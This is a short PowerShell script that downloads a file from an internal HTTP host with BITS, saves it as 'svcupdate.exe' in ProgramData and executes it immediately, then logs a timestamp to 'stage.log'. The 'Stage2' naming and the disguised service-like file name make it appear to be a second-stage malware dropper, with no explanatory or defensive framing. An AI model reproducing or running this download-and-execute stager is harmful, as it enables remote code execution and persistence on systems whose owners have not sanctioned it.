
$TransferUrl = "http://internal.corp:8080/assets/update.dat"
$Stage2Path = 'C:\ProgramData\svcupdate.exe'
Start-BitsTransfer -Source $TransferUrl -Destination $Stage2Path
& $Stage2Path
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
